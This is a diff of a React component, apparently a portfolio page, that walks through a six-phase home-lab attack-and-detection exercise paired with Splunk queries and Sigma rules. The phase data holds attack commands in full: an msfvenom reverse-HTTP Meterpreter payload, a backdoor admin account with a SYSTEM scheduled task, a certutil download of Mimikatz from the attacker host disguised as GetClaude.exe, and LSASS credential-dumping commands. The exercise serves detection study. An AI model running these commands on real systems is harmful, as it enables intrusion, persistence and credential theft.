@@ -1,5 +1,4 @@
 import { useState, useCallback } from "react";
-import { motion, AnimatePresence } from "framer-motion";
 import {
   ShieldAlert,
   Terminal,
@@ -16,300 +15,206 @@ import {
   Network,
   UserCheck,
   Cpu,
+  ArrowRight,
+  ArrowLeft,
+  Activity,
 } from "lucide-react";
 
 /* ──────────────────────────────────────────────────────────────────────
-   Data types
+   Data types & Phase Information
    ────────────────────────────────────────────────────────────────────── */
 
-interface SubStep {
-  title: string;
-  whatIDid: string;
-  commandOrTool: string;
-  howIDetectedIt: string;
-  logSource: string;
-  splunkQuery: string;
-}
-
-interface SimulationStep {
+interface SimulationPhase {
   id: string;
   stepNum: string;
   title: string;
+  shortTitle: string;
   icon: any;
   overview: string;
-  subSteps: SubStep[];
+  whatIDid: string;
+  commandOrTool: string;
+  commandLabel: string;
+  howIDetectedIt: string;
+  logSources: string[];
+  splunkQuery: string;
 }
 
-/* ──────────────────────────────────────────────────────────────────────
-   Simulation phases data
-   ────────────────────────────────────────────────────────────────────── */
-
-const simulationSteps: SimulationStep[] = [
+const simulationPhases: SimulationPhase[] = [
   {
     id: "step-1",
     stepNum: "01",
-    title: "Initial Access & C2",
+    title: "Initial Access & Command and Control (C2)",
+    shortTitle: "Initial Access & C2",
     icon: Network,
     overview:
-      "I staged a reverse HTTP Meterpreter payload on Kali Linux and executed it on the target Windows 10 endpoint to gain an initial foothold.",
-    subSteps: [
-      {
-        title: "Executing the Staged Payload",
-        whatIDid:
-          "I generated an executable payload (FreeClude.exe) using Metasploit on Kali Linux. On the Windows 10 target machine, I launched the executable to initiate communication back to my listener.",
-        commandOrTool: "msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.110.141 LPORT=80 -f exe > FreeClude.exe",
-        howIDetectedIt:
-          "I checked Sysmon Event ID 1 (Process Creation) in Splunk to confirm the execution of FreeClude.exe and identify its parent process and file hash.",
-        logSource: "Sysmon Event ID 1 & Windows Security Event 4688",
-        splunkQuery: 'index=windows EventCode=1 Image="*\\\\FreeClude.exe" | table _time host User Image ParentImage ProcessGuid',
-      },
-      {
-        title: "Establishing Reverse HTTP C2",
-        whatIDid:
-          "Once FreeClude.exe ran, it initiated an outbound HTTP connection on port 80 back to Kali Linux, opening an interactive Meterpreter session.",
-        commandOrTool: "msfconsole (exploit/multi/handler with windows/x64/meterpreter/reverse_http)",
-        howIDetectedIt:
-          "I monitored Sysmon Event ID 3 (Network Connection) in Splunk to spot the outbound TCP connection from FreeClude.exe to my Kali IP address on port 80.",
-        logSource: "Sysmon Event ID 3 (Network Connection)",
-        splunkQuery: 'index=windows EventCode=3 Image="*\\\\FreeClude.exe" DestinationPort=80 | table _time host Image DestinationIp DestinationPort',
-      },
+      "Staged a reverse HTTP Meterpreter payload on Kali Linux and executed it on Windows 10 to establish an outbound C2 session.",
+    whatIDid:
+      "I generated an executable payload (FreeClude.exe) using Metasploit on Kali Linux. On the Windows 10 target machine, I launched the executable to initiate an outbound HTTP connection back to my listener on port 80, opening an interactive Meterpreter session.",
+    commandLabel: "Metasploit Payload Generation & Handler",
+    commandOrTool:
+      "msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.110.141 LPORT=80 -f exe > FreeClude.exe\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_http\nexploit",
+    howIDetectedIt:
+      "I identified process creation events for FreeClude.exe and correlated them with outbound TCP network traffic to Kali Linux on port 80, extracting the parent process and session GUID.",
+    logSources: [
+      "Sysmon Event ID 1 (Process Creation)",
+      "Sysmon Event ID 3 (Network Connection)",
+      "Windows Security 4688",
     ],
+    splunkQuery:
+      'index=windows (EventCode=1 OR EventCode=3) Image="*\\\\FreeClude.exe"\n| table _time host Image DestinationIp DestinationPort ProcessGuid',
   },
   {
     id: "step-2",
     stepNum: "02",
-    title: "System Discovery",
+    title: "System Discovery & Host Fingerprinting",
+    shortTitle: "System Discovery",
     icon: Search,
     overview:
-      "Through the active Meterpreter session, I ran basic Windows commands to understand my current privileges and identify the operating system.",
-    subSteps: [
-      {
-        title: "Checking User Identity & Privileges",
-        whatIDid:
-          "I opened a Windows command shell through Meterpreter and ran whoami to check what privileges the current session held and whether I was running with administrator rights.",
-        commandOrTool: "whoami",
-        howIDetectedIt:
-          "In Splunk, I searched for instances where whoami.exe was spawned by cmd.exe as a child process of the initial payload.",
-        logSource: "Sysmon Event ID 1 (Process Creation)",
-        splunkQuery: 'index=windows EventCode=1 Image="*\\\\whoami.exe" ParentImage="*\\\\cmd.exe"',
-      },
-      {
-        title: "Fingerprinting Host & OS Build",
-        whatIDid:
-          "I ran hostname and systeminfo within a 30-second window to quickly gather the computer name, OS build, architecture, and network configuration.",
-        commandOrTool: "hostname && systeminfo",
-        howIDetectedIt:
-          "I tracked rapid burst process creation in Splunk, which is a classic indicator of automated or manual post-exploitation discovery.",
-        logSource: "Sysmon Event ID 1 (Process Creation)",
-        splunkQuery: 'index=windows EventCode=1 Image IN ("*\\\\hostname.exe", "*\\\\systeminfo.exe") | table _time host User CommandLine',
-      },
+      "Conducted post-compromise reconnaissance using native Windows utilities to verify user privileges and operating system details.",
+    whatIDid:
+      "Through the active Meterpreter session, I opened a Windows command shell and executed native discovery commands (whoami, hostname, systeminfo) in rapid succession to inspect user permissions and system architecture.",
+    commandLabel: "Reconnaissance Commands",
+    commandOrTool: "whoami && hostname && systeminfo",
+    howIDetectedIt:
+      "In Splunk, I hunted for instances where discovery executables were spawned by cmd.exe as direct children of the Meterpreter payload within a tight 30-second execution window.",
+    logSources: [
+      "Sysmon Event ID 1 (Process Creation)",
+      "Windows Security 4688",
     ],
+    splunkQuery:
+      'index=windows EventCode=1 Image IN ("*\\\\whoami.exe", "*\\\\hostname.exe", "*\\\\systeminfo.exe")\n| table _time host User Image ParentImage CommandLine',
   },
   {
     id: "step-3",
     stepNum: "03",
     title: "Persistence & Privilege Escalation",
+    shortTitle: "Persistence & PrivEsc",
     icon: UserCheck,
     overview:
-      "To ensure I could re-enter the machine at any time, I created a local administrator user and scheduled an elevated background task.",
-    subSteps: [
-      {
-        title: "Creating a Backdoor Admin Account",
-        whatIDid:
-          "I created a new local Windows account using net user and immediately added it to the local Administrators group for full system control.",
-        commandOrTool: "net user saad P@ssw0rd123 /add && net localgroup Administrators saad /add",
-        howIDetectedIt:
-          "I investigated Windows Security audit logs in Splunk for Event 4720 (User Account Created) and Event 4732 (Member Added to Security Group).",
-        logSource: "Windows Security Events 4720 & 4732",
-        splunkQuery: 'index=windows (EventCode=4720 OR EventCode=4732) | table _time TargetUserName MemberName SubjectUserName GroupName',
-      },
-      {
-        title: "Installing a SYSTEM Scheduled Task",
-        whatIDid:
-          "I registered a scheduled task using schtasks.exe that runs automatically at every user logon under the highest NT AUTHORITY\\SYSTEM privilege level, then deleted the temporary user.",
-        commandOrTool: 'schtasks /create /tn "SystemHealth" /tr "C:\\Windows\\Temp\\FreeClude.exe" /sc onlogon /ru "SYSTEM"',
-        howIDetectedIt:
-          "I searched for Windows Event 4698 (A scheduled task was created) and parsed the XML payload to see which user account registered the task and under what principal it runs.",
-        logSource: "Windows Security Event 4698 & Sysmon Event ID 1",
-        splunkQuery: 'index=windows EventCode=4698 | xmlkv | search UserId="*SYSTEM*" | table _time host TaskName UserId',
-      },
+      "Created a local administrator account and scheduled an elevated background task running as SYSTEM at user logon.",
+    whatIDid:
+      "To maintain persistence, I used net user to create a backdoor account ('saad') and added it to the local Administrators group. I then registered a Windows scheduled task ('SystemHealth') configured to run the payload with NT AUTHORITY\\SYSTEM privileges whenever any user logs in.",
+    commandLabel: "Account Creation & Scheduled Task Registration",
+    commandOrTool:
+      'net user saad P@ssw0rd123 /add\nnet localgroup Administrators saad /add\nschtasks /create /tn "SystemHealth" /tr "C:\\Windows\\Temp\\FreeClude.exe" /sc onlogon /ru "SYSTEM"',
+    howIDetectedIt:
+      "I investigated Windows Security audit logs for account creation and privileged group modification events, followed by Task Scheduler XML event logs indicating elevated task registration.",
+    logSources: [
+      "Windows Security 4720 (User Created)",
+      "Windows Security 4732 (Group Member Added)",
+      "Windows Security 4698 (Task Created)",
     ],
+    splunkQuery:
+      'index=windows (EventCode=4720 OR EventCode=4732 OR EventCode=4698)\n| table _time TargetUserName MemberName SubjectUserName TaskName',
   },
   {
     id: "step-4",
     stepNum: "04",
     title: "Tool Transfer via certutil (LOLBIN)",
+    shortTitle: "certutil LOLBIN Transfer",
     icon: Cpu,
     overview:
-      "Instead of using a web browser, I abused the legitimate Windows utility certutil.exe to download secondary offensive tools onto the victim.",
-    subSteps: [
-      {
-        title: "Downloading Tools with certutil",
-        whatIDid:
-          "I used the native Windows certificate tool certutil.exe with the -urlcache parameter to pull mimikatz.exe from my Kali web server without triggering standard browser download prompts.",
-        commandOrTool: "certutil -urlcache -split -f http://192.168.110.141/mimikatz.exe GetClaude.exe",
-        howIDetectedIt:
-          "In Splunk, I wrote a hunt query for certutil.exe executing with the -urlcache flag, which is a common Living-off-the-Land Binary (LOLBIN) abuse pattern.",
-        logSource: "Sysmon Event ID 1 & Event ID 3",
-        splunkQuery: 'index=windows EventCode=1 Image="*\\\\certutil.exe" CommandLine="*-urlcache*" | table _time host User CommandLine ProcessGuid',
-      },
-      {
-        title: "Masquerading the Payload Name",
-        whatIDid:
-          "I renamed the downloaded Mimikatz binary to GetClaude.exe to disguise it as a legitimate AI utility and avoid immediate detection from file names.",
-        commandOrTool: "Saved as: C:\\Users\\saad\\Downloads\\GetClaude.exe",
-        howIDetectedIt:
-          "I checked Sysmon Event ID 11 (File Create) in Splunk to detect whenever a new executable was written to disk by certutil.exe.",
-        logSource: "Sysmon Event ID 11 (File Create)",
-        splunkQuery: 'index=windows EventCode=11 TargetFilename="*\\\\GetClaude.exe" | table _time Image TargetFilename ProcessGuid',
-      },
+      "Abused the native Windows certutil.exe utility to download secondary attack tools while masquerading the binary name.",
+    whatIDid:
+      "Instead of using a web browser, I abused the legitimate Windows certificate utility certutil.exe with the -urlcache parameter to pull mimikatz.exe from my Kali HTTP server directly to disk, masquerading it under the benign filename GetClaude.exe.",
+    commandLabel: "certutil Ingress & Masquerading",
+    commandOrTool:
+      "certutil -urlcache -split -f http://192.168.110.141/mimikatz.exe GetClaude.exe",
+    howIDetectedIt:
+      "I built a Splunk detection rule flagging any execution of certutil.exe containing the -urlcache or -split command-line flags, and verified the newly dropped binary in file creation telemetry.",
+    logSources: [
+      "Sysmon Event ID 1 (certutil LOLBIN Abuse)",
+      "Sysmon Event ID 11 (File Create)",
+      "Sysmon Event ID 3 (Network Ingress)",
     ],
+    splunkQuery:
+      'index=windows EventCode=1 Image="*\\\\certutil.exe" CommandLine="*-urlcache*"\n| table _time host User CommandLine ProcessGuid',
   },
   {
     id: "step-5",
     stepNum: "05",
-    title: "Credential Access (Mimikatz)",
+    title: "Credential Access & Memory Inspection (Mimikatz)",
+    shortTitle: "Credential Access",
     icon: KeyRound,
     overview:
-      "I ran the disguised Mimikatz binary and enabled debug privileges to prepare for credential harvesting against LSASS memory.",
-    subSteps: [
-      {
-        title: "Enabling Debug Privileges",
-        whatIDid:
-          "I ran GetClaude.exe and entered privilege::debug. It returned Privilege 20 OK, which granted SeDebugPrivilege so the process could inspect sensitive Windows system processes.",
-        commandOrTool: "GetClaude.exe -> privilege::debug",
-        howIDetectedIt:
-          "In Splunk, I created an alert searching for command-line arguments containing privilege::debug or known Mimikatz command keywords.",
-        logSource: "Sysmon Event ID 1 (Process Creation)",
-        splunkQuery: 'index=windows EventCode=1 (Image="*\\\\GetClaude.exe" OR CommandLine="*privilege::debug*") | table _time host User CommandLine IntegrityLevel',
-      },
-      {
-        title: "Hunting for LSASS Memory Access",
-        whatIDid:
-          "Once debug privilege was confirmed, the process was positioned to interact with the Local Security Authority Subsystem Service (lsass.exe) memory.",
-        commandOrTool: "sekurlsa::logonpasswords (Targeting lsass.exe)",
-        howIDetectedIt:
-          "I monitored Sysmon Event ID 10 (Process Access) in Splunk to flag any non-system process requesting read/query access handles to lsass.exe.",
-        logSource: "Sysmon Event ID 10 (Process Access targeting lsass.exe)",
-        splunkQuery: 'index=windows EventCode=10 TargetImage="*\\\\lsass.exe" GrantedAccess="*0x1010*" | table _time SourceImage TargetImage GrantedAccess',
-      },
+      "Executed Mimikatz, enabled SeDebugPrivilege, and monitored unauthorized handle requests targeting LSASS process memory.",
+    whatIDid:
+      "I ran GetClaude.exe (disguised Mimikatz) and executed privilege::debug, receiving Privilege 20 OK which granted SeDebugPrivilege. This positioned the offensive process to access sensitive authentication memory within the Local Security Authority Subsystem Service (lsass.exe).",
+    commandLabel: "Mimikatz Debug Privilege & LSASS Targeting",
+    commandOrTool:
+      "GetClaude.exe\nprivilege::debug\nsekurlsa::logonpasswords (Targeting lsass.exe)",
+    howIDetectedIt:
+      "I monitored Sysmon Event ID 10 for any non-system process requesting read/query access handles to lsass.exe with suspicious access mask permissions (0x1010), alongside command-line searches for privilege::debug.",
+    logSources: [
+      "Sysmon Event ID 10 (Process Access to lsass.exe)",
+      "Sysmon Event ID 1 (Command Line Execution)",
     ],
+    splunkQuery:
+      'index=windows EventCode=10 TargetImage="*\\\\lsass.exe" GrantedAccess="*0x1010*"\n| table _time SourceImage TargetImage GrantedAccess CallTrace',
   },
   {
     id: "step-6",
     stepNum: "06",
-    title: "Splunk SIEM Correlation & Defense",
+    title: "Splunk SIEM Correlation & Sigma Detection Engineering",
+    shortTitle: "SIEM Correlation & Defense",
     icon: ShieldCheck,
     overview:
-      "In Splunk Enterprise, I correlated all collected logs across the timeline, authored Sigma detection rules, and converted them into production alerts.",
-    subSteps: [
-      {
-        title: "Timeline Reconstruction via ProcessGuid",
-        whatIDid:
-          "Instead of viewing each event in isolation, I correlated the initial payload, the network C2 socket, and the child processes together using the unique Sysmon ProcessGuid.",
-        commandOrTool: "Splunk SPL Transaction Searches & Correlation Matrix",
-        howIDetectedIt:
-          "I ran a transaction search grouping all events sharing the compromised ProcessGuid, producing a chronological reconstruction of the complete attack.",
-        logSource: "Sysmon + Windows Security Audit Trail",
-        splunkQuery: 'index=windows (host="Sh-Win10" OR host="SH-WIN10") | transaction ProcessGuid maxspan=2h | table _time host Image CommandLine EventCode',
-      },
-      {
-        title: "Creating Sigma Detection Rules",
-        whatIDid:
-          "I translated the observed behaviors into formal Sigma rules (for scheduled task abuse and certutil ingress) and converted them into active Splunk SPL alert triggers.",
-        commandOrTool: "SigmaHQ Rule Specification + Splunk Saved Searches",
-        howIDetectedIt:
-          "Configured automated alert searches in Splunk that trigger whenever high-risk command patterns (like certutil -urlcache or privilege::debug) occur in production.",
-        logSource: "Splunk Alerting Engine",
-        splunkQuery: 'index=windows EventCode=1 CommandLine IN ("*-urlcache*", "*privilege::debug*") | stats count by host User Image CommandLine',
-      },
+      "Correlated all multi-stage telemetry using the Sysmon ProcessGuid transaction matrix, authored Sigma rules, and deployed alerts.",
+    whatIDid:
+      "I connected the entire intrusion chain across time by grouping all related events using the unique Sysmon ProcessGuid. I then authored production-ready Sigma detection rules for LOLBIN transfer and credential access, converting them into automated Splunk alerting searches.",
+    commandLabel: "Splunk Transaction Correlation Matrix",
+    commandOrTool:
+      "index=windows (host=\"Sh-Win10\" OR host=\"SH-WIN10\")\n| transaction ProcessGuid maxspan=2h\n| table _time host Image CommandLine EventCode",
+    howIDetectedIt:
+      "Configured automated Splunk saved searches and alert actions that instantly notify analysts whenever high-fidelity indicators (such as certutil URL cache downloads or LSASS process tampering) occur in production.",
+    logSources: [
+      "Sysmon + Windows Security Audit Trail",
+      "Splunk Saved Searches & Alert Engine",
+      "Sigma Rule Specification",
     ],
+    splunkQuery:
+      'index=windows EventCode=1 CommandLine IN ("*-urlcache*", "*privilege::debug*")\n| stats count by host User Image CommandLine',
   },
 ];
-
-/* ──────────────────────────────────────────────────────────────────────
-   Framer Motion animation presets
-   ────────────────────────────────────────────────────────────────────── */
-
-const expandVariants = {
-  collapsed: { opacity: 0, height: 0, overflow: "hidden" as const },
-  expanded: {
-    opacity: 1,
-    height: "auto",
-    overflow: "visible" as const,
-    transition: { duration: 0.35, ease: [0.22, 1, 0.36, 1], overflow: { delay: 0.35 } },
-  },
-  exit: {
-    opacity: 0,
-    height: 0,
-    overflow: "hidden" as const,
-    transition: { duration: 0.25, ease: [0.22, 1, 0.36, 1] },
-  },
-};
-
-const panelVariants = {
-  initial: { opacity: 0, x: 16, filter: "blur(6px)" },
-  animate: {
-    opacity: 1,
-    x: 0,
-    filter: "blur(0px)",
-    transition: { duration: 0.4, ease: [0.22, 1, 0.36, 1] },
-  },
-  exit: {
-    opacity: 0,
-    x: -12,
-    filter: "blur(4px)",
-    transition: { duration: 0.2, ease: [0.22, 1, 0.36, 1] },
-  },
-};
-
-const subBtnVariants = {
-  initial: { opacity: 0, x: -8 },
-  animate: (i: number) => ({
-    opacity: 1,
-    x: 0,
-    transition: { delay: i * 0.06, duration: 0.25, ease: [0.22, 1, 0.36, 1] },
-  }),
-  exit: { opacity: 0, x: -8, transition: { duration: 0.15 } },
-};
 
 /* ──────────────────────────────────────────────────────────────────────
    Component
    ────────────────────────────────────────────────────────────────────── */
 
 export default function AttackTreeMap() {
-  const [expandedStepId, setExpandedStepId] = useState<string | null>("step-1");
-  const [selectedSubIdx, setSelectedSubIdx] = useState<number>(0);
-  const [copiedQuery, setCopiedQuery] = useState<boolean>(false);
+  const [activeStepId, setActiveStepId] = useState<string>("step-1");
+  const [copiedQueryId, setCopiedQueryId] = useState<string | null>(null);
+  const [copiedCmdId, setCopiedCmdId] = useState<string | null>(null);
 
-  const activeStep =
-    expandedStepId ? simulationSteps.find((s) => s.id === expandedStepId) : null;
-  const activeSub =
-    activeStep ? (activeStep.subSteps[selectedSubIdx] || activeStep.subSteps[0]) : null;
+  const activeIndex = simulationPhases.findIndex((p) => p.id === activeStepId);
 
-  const toggleStep = useCallback(
-    (id: string) => {
-      if (expandedStepId === id) {
-        setExpandedStepId(null);
-      } else {
-        setExpandedStepId(id);
-        setSelectedSubIdx(0);
-      }
-    },
-    [expandedStepId]
-  );
+  const toggleStep = useCallback((id: string) => {
+    setActiveStepId((prev) => (prev === id ? "" : id));
+  }, []);
 
-  const handleCopy = (text: string) => {
+  const handleCopyQuery = (text: string, id: string) => {
     navigator.clipboard.writeText(text);
-    setCopiedQuery(true);
-    setTimeout(() => setCopiedQuery(false), 2000);
+    setCopiedQueryId(id);
+    setTimeout(() => setCopiedQueryId(null), 2000);
+  };
+
+  const handleCopyCmd = (text: string, id: string) => {
+    navigator.clipboard.writeText(text);
+    setCopiedCmdId(id);
+    setTimeout(() => setCopiedCmdId(null), 2000);
+  };
+
+  const goToStep = (index: number) => {
+    if (index >= 0 && index < simulationPhases.length) {
+      setActiveStepId(simulationPhases[index].id);
+    }
   };
 
   return (
-    <div className="bg-card/60 border border-primary/25 rounded-2xl p-5 md:p-7 relative overflow-hidden backdrop-blur-md shadow-[0_0_40px_rgba(255,107,53,0.06)]">
-      {/* Decorative ambient glow */}
-      <div className="absolute top-0 right-0 w-96 h-96 bg-primary/10 rounded-full blur-[120px] pointer-events-none -mr-20 -mt-20" />
-      <div className="absolute bottom-0 left-0 w-96 h-96 bg-emerald-500/5 rounded-full blur-[120px] pointer-events-none -ml-20 -mb-20" />
+    <div className="bg-card/60 border border-primary/25 rounded-2xl p-4 sm:p-6 md:p-8 relative overflow-hidden backdrop-blur-md shadow-[0_0_40px_rgba(255,107,53,0.06)]">
+      {/* Decorative ambient background glows */}
+      <div className="absolute top-0 right-0 w-96 h-96 bg-primary/10 rounded-full blur-[130px] pointer-events-none -mr-20 -mt-20" />
+      <div className="absolute bottom-0 left-0 w-96 h-96 bg-emerald-500/5 rounded-full blur-[130px] pointer-events-none -ml-20 -mb-20" />
 
       {/* ── Top Header ── */}
       <div className="flex flex-col lg:flex-row lg:items-start justify-between gap-4 pb-6 border-b border-foreground/10 relative z-10">
@@ -381,281 +286,223 @@ export default function AttackTreeMap() {
         </p>
       </div>
 
-      {/* ── Step-by-Step Interactive Map ── */}
-      <div className="pt-6 relative z-10">
-        <div className="flex items-center justify-between gap-3 mb-5">
+      {/* ── Interactive Left-to-Right Phase Pipeline Stepper ── */}
+      <div className="pt-6 pb-4 relative z-10">
+        <div className="flex items-center justify-between gap-3 mb-3">
           <div className="flex items-center gap-2">
             <div className="w-7 h-7 rounded-lg bg-primary/15 border border-primary/30 flex items-center justify-center text-primary">
-              <Terminal size={14} />
+              <Activity size={14} />
             </div>
             <div>
               <span className="text-xs sm:text-sm font-bold text-foreground uppercase tracking-wider">
-                Simulation Process & Investigation Map
+                Attack & Investigation Phases (01 → 06)
               </span>
               <p className="text-[11px] text-muted-foreground hidden sm:block">
-                Click any phase to expand it and explore the detailed sub-steps
+                Click any phase to expand its actions, commands, and Splunk detection telemetry
               </p>
             </div>
           </div>
           <span className="text-[10px] font-mono text-primary bg-primary/10 border border-primary/20 px-2.5 py-0.5 rounded-full">
-            Interactive Tree
+            {activeStepId ? `Phase ${simulationPhases[activeIndex]?.stepNum} of 06` : "Select a Phase"}
           </span>
         </div>
 
-        {/* ── Grid: Left Tree + Right Detail Panel ── */}
-        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5 items-start">
+        {/* Horizontal Pipeline Track (Left to Right) */}
+        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2 pt-2">
+          {simulationPhases.map((phase, pIdx) => {
+            const isActive = activeStepId === phase.id;
+            const PhaseIcon = phase.icon;
 
-          {/* ── Left Column: Phase Nodes ── */}
-          <div className="lg:col-span-5 space-y-4">
-            {simulationSteps.map((step, stepIdx) => {
-              const isExpanded = expandedStepId === step.id;
-              const StepIcon = step.icon;
-              const completedRatio = expandedStepId
-                ? stepIdx <=
-                  simulationSteps.findIndex((s) => s.id === expandedStepId)
-                  ? 1
-                  : 0
-                : 0;
+            return (
+              <button
+                key={phase.id}
+                type="button"
+                onClick={() => setActiveStepId(isActive ? "" : phase.id)}
+                className={`flex flex-col items-start p-2.5 rounded-xl border text-left transition-all duration-300 relative group overflow-hidden ${
+                  isActive
+                    ? "bg-primary/15 border-primary shadow-[0_0_16px_rgba(255,107,53,0.18)]"
+                    : "bg-foreground/[0.02] border-foreground/8 hover:border-primary/35 hover:bg-foreground/[0.05]"
+                }`}
+              >
+                {/* Top active indicator line */}
+                <div
+                  className={`absolute top-0 left-0 right-0 h-0.5 transition-all duration-300 ${
+                    isActive
+                      ? "bg-gradient-to-r from-primary via-primary/80 to-primary shadow-[0_0_8px_rgba(255,107,53,0.8)]"
+                      : "bg-transparent group-hover:bg-primary/25"
+                  }`}
+                />
 
-              return (
-                <div key={step.id} className="relative">
-                  {/* Vertical connector line between phase nodes */}
-                  {stepIdx < simulationSteps.length - 1 && !isExpanded && (
-                    <div
-                      className="absolute left-[19px] w-0.5 rounded-full"
-                      style={{
-                        top: "48px",
-                        height: "12px",
-                        background: completedRatio
-                          ? "linear-gradient(to bottom, rgba(255,107,53,0.5), rgba(255,107,53,0.1))"
-                          : "rgba(255,255,255,0.06)",
-                      }}
-                    />
-                  )}
-
-                  {/* Phase Node Button */}
-                  <button
-                    type="button"
-                    onClick={() => toggleStep(step.id)}
-                    className={`w-full flex items-center gap-3 p-2.5 rounded-xl border text-left transition-all duration-300 group relative overflow-hidden ${
-                      isExpanded
-                        ? "bg-primary/12 border-primary/50 shadow-[0_0_20px_rgba(255,107,53,0.12)]"
-                        : "bg-foreground/[0.02] border-foreground/8 hover:border-primary/25 hover:bg-foreground/[0.04]"
+                <div className="flex items-center justify-between w-full mb-1.5">
+                  <span
+                    className={`text-[10px] font-mono font-bold px-1.5 py-0.5 rounded transition-colors ${
+                      isActive
+                        ? "bg-primary text-primary-foreground"
+                        : "bg-foreground/10 text-muted-foreground group-hover:text-foreground"
                     }`}
                   >
-                    {/* Animated background sweep on hover */}
-                    <motion.div
-                      className="absolute inset-0 rounded-xl pointer-events-none"
-                      initial={false}
-                      animate={{
-                        background: isExpanded
-                          ? "radial-gradient(ellipse at 0% 50%, rgba(255,107,53,0.08) 0%, transparent 70%)"
-                          : "transparent",
-                      }}
-                      transition={{ duration: 0.4 }}
-                    />
+                    Phase {phase.stepNum}
+                  </span>
+                  <div
+                    className={`w-6 h-6 rounded-md flex items-center justify-center transition-colors ${
+                      isActive
+                        ? "bg-primary/25 text-primary"
+                        : "text-muted-foreground/60 group-hover:text-primary"
+                    }`}
+                  >
+                    <PhaseIcon size={13} />
+                  </div>
+                </div>
 
-                    {/* Icon circle */}
-                    <div
-                      className={`w-10 h-10 rounded-xl flex items-center justify-center shrink-0 border transition-all duration-300 relative z-10 ${
+                <span
+                  className={`text-xs font-semibold line-clamp-1 transition-colors ${
+                    isActive ? "text-primary" : "text-foreground/85 group-hover:text-foreground"
+                  }`}
+                >
+                  {phase.shortTitle}
+                </span>
+
+                <div className="mt-1 flex items-center gap-1 text-[10px] text-muted-foreground/60">
+                  <span className={`w-1.5 h-1.5 rounded-full ${isActive ? "bg-emerald-400" : "bg-foreground/20"}`} />
+                  <span>{isActive ? "Active" : `Step ${pIdx + 1}`}</span>
+                </div>
+              </button>
+            );
+          })}
+        </div>
+      </div>
+
+      {/* ── Full-Width Smooth Expanding Phase Cards (Left to Right) ── */}
+      <div className="pt-2 space-y-3 relative z-10">
+        {simulationPhases.map((phase, pIdx) => {
+          const isExpanded = activeStepId === phase.id;
+          const PhaseIcon = phase.icon;
+
+          return (
+            <div
+              key={phase.id}
+              className={`rounded-xl border transition-all duration-300 overflow-hidden ${
+                isExpanded
+                  ? "bg-background/85 border-primary/45 shadow-[0_4px_24px_rgba(255,107,53,0.1)]"
+                  : "bg-background/40 border-foreground/8 hover:border-primary/25 hover:bg-background/60"
+              }`}
+            >
+              {/* ── Phase Header Button (Spanning Left to Right) ── */}
+              <button
+                type="button"
+                onClick={() => toggleStep(phase.id)}
+                className="w-full flex items-center gap-3.5 p-3.5 sm:p-4 text-left transition-colors relative group focus:outline-none"
+                aria-expanded={isExpanded}
+              >
+                {/* Left accent bar */}
+                <div
+                  className={`absolute left-0 top-0 bottom-0 w-1 transition-all duration-300 ${
+                    isExpanded
+                      ? "bg-primary shadow-[0_0_10px_rgba(255,107,53,0.8)]"
+                      : "bg-transparent group-hover:bg-primary/40"
+                  }`}
+                />
+
+                {/* Phase Icon */}
+                <div
+                  className={`w-10 h-10 rounded-xl flex items-center justify-center shrink-0 border transition-all duration-300 ${
+                    isExpanded
+                      ? "bg-primary/20 border-primary text-primary shadow-[0_0_14px_rgba(255,107,53,0.25)]"
+                      : "bg-foreground/5 border-foreground/10 text-muted-foreground group-hover:text-primary group-hover:border-primary/30"
+                  }`}
+                >
+                  <PhaseIcon size={18} />
+                </div>
+
+                {/* Phase Title & Overview */}
+                <div className="flex-1 min-w-0 pr-2">
+                  <div className="flex items-center gap-2 flex-wrap mb-0.5">
+                    <span
+                      className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded transition-colors ${
                         isExpanded
-                          ? "bg-primary/20 border-primary/50 text-primary shadow-[0_0_12px_rgba(255,107,53,0.3)]"
-                          : "bg-foreground/5 border-foreground/10 text-muted-foreground group-hover:text-primary group-hover:border-primary/30"
+                          ? "bg-primary text-primary-foreground"
+                          : "bg-foreground/10 text-muted-foreground group-hover:bg-foreground/15"
                       }`}
                     >
-                      <StepIcon size={18} />
-                    </div>
-
-                    {/* Label */}
-                    <div className="flex-1 min-w-0 relative z-10">
-                      <div className="flex items-center gap-2">
-                        <span
-                          className={`text-[10px] font-mono font-bold px-1.5 py-0.5 rounded transition-colors duration-300 ${
-                            isExpanded
-                              ? "bg-primary text-primary-foreground"
-                              : "bg-foreground/10 text-muted-foreground"
-                          }`}
-                        >
-                          Phase {step.stepNum}
-                        </span>
-                        <span
-                          className={`text-sm font-bold truncate transition-colors duration-200 ${
-                            isExpanded
-                              ? "text-primary"
-                              : "text-foreground/80 group-hover:text-foreground"
-                          }`}
-                        >
-                          {step.title}
-                        </span>
-                      </div>
-                      <p className="text-[11px] text-muted-foreground/60 mt-0.5 line-clamp-1 pr-4">
-                        {step.overview}
-                      </p>
-                    </div>
-
-                    {/* Chevron */}
-                    <motion.div
-                      initial={false}
-                      animate={{ rotate: isExpanded ? 180 : 0 }}
-                      transition={{ duration: 0.3, ease: [0.22, 1, 0.36, 1] }}
-                      className="shrink-0 relative z-10"
-                    >
-                      <ChevronDown
-                        size={16}
-                        className={`transition-colors duration-200 ${
-                          isExpanded ? "text-primary" : "text-muted-foreground/40 group-hover:text-primary/60"
-                        }`}
-                      />
-                    </motion.div>
-                  </button>
-
-                  {/* ── Expanded Sub-Steps ── */}
-                  <AnimatePresence>
-                    {isExpanded && (
-                      <motion.div
-                        key={`expand-${step.id}`}
-                        variants={expandVariants}
-                        initial="collapsed"
-                        animate="expanded"
-                        exit="exit"
-                        className="ml-6 pl-5 pt-2 pb-1 space-y-1.5 relative"
-                      >
-                        {/* Vertical branch line */}
-                        <div className="absolute left-0 top-0 bottom-0 w-px bg-gradient-to-b from-primary/40 via-primary/20 to-transparent" />
-
-                        {step.subSteps.map((sub, sIdx) => {
-                          const isSubActive = selectedSubIdx === sIdx;
-
-                          return (
-                            <motion.button
-                              key={sIdx}
-                              custom={sIdx}
-                              variants={subBtnVariants}
-                              initial="initial"
-                              animate="animate"
-                              exit="exit"
-                              type="button"
-                              onClick={() => setSelectedSubIdx(sIdx)}
-                              className={`w-full flex items-center gap-2.5 p-2.5 rounded-lg border text-left text-xs transition-all duration-200 relative ${
-                                isSubActive
-                                  ? "bg-primary/15 border-primary/50 text-foreground font-semibold shadow-[0_0_12px_rgba(255,107,53,0.1)]"
